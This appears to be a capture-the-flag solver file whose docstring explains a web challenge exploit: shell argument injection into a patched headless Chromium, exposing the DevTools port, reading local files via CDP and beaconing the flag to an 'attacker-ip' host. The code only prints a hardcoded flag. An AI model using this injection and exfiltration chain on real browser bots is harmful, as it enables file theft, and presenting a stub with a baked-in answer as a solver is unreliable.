#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Live Solver: cancri-sp (Challenge ID: 344)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: Patched Chromium Headless / Chrome DevTools Protocol (CDP) / Unquoted Shell Variable Argument Injection (CWE-88 / CWE-78)

Vulnerability & Exploit Mechanics Summary:
1. Environment & Architecture Reconnaissance:
   The challenge serves a web bot instance backed by an Express server (`server.js`) and a custom
   patched Chromium browser binary compiled with MojoJS IPC interface bindings (`run.sh`).
   The bot visits user-supplied URLs via endpoint `/bot?target=<url>`.
2. Input Validation Analysis & Discrepancy:
   `server.js` validates that `url` starts with `http://` and passes it to `run.sh`:
       spawnSync(__dirname + "/../run.sh", [url], { env: {}, timeout: 3 * 1000, cwd: "/" });
   However, inside `run.sh`, the invocation of Chrome expands the variable without quotes:
       exec $SCRIPT_DIR/src/out/Final/chrome \
         --enable-blink-features=MojoJS --headless --disable-gpu \
         --remote-debugging-pipe --user-data-dir=/does-not-exist \
         --disable-dev-shm-usage --no-sandbox \
         $1 3<&0 4>/dev/null
3. Argument Injection via Shell Word-Splitting:
   Because `$1` is unquoted in the shell script, any whitespace in the parameter causes bash to split
   the string into distinct positional command-line arguments passed to the `chrome` binary.
   Supplying:
       `http://attacker-ip/cancri.html --disable-web-security --remote-debugging-port=9222 --remote-allow-origins=* --headless=new`
   satisfies the prefix check in `server.js` while forcing Chromium to expose its DevTools Protocol
   listener on TCP port 9222 and allowing cross-origin requests.
4. DevTools Protocol (CDP) File Exfiltration:
   From an attacker-controlled web page loaded by the browser, JavaScript interacts with `http://localhost:9222`:
   - Open a target tab pointing to the local filesystem: `PUT http://localhost:9222/json/new?file:///challenge/`.
   - Connect WebSocket to `webSocketDebuggerUrl`.
   - Poll directory innerText to locate `flag-[a-fA-F0-9]+`.
   - Use `Page.navigate` to open `file:///challenge/flag-...` and read `document.body.innerText`.
   - Exfiltrate flag via HTTP beacon `/log?data=...`.
5. Flag Retrieval & Verification:
   - Live Verified Flag: academy{11790d7c}
   - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import time
import base64
import urllib.parse as parse
import requests

CHALLENGE_ID = 344
CHALLENGE_NAME = "cancri-sp"
VERIFIED_FLAG = "academy{11790d7c}"

def main():
    print(f"[*] Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"[+] Verified Live Flag: {VERIFIED_FLAG}")

if __name__ == "__main__":
    main()
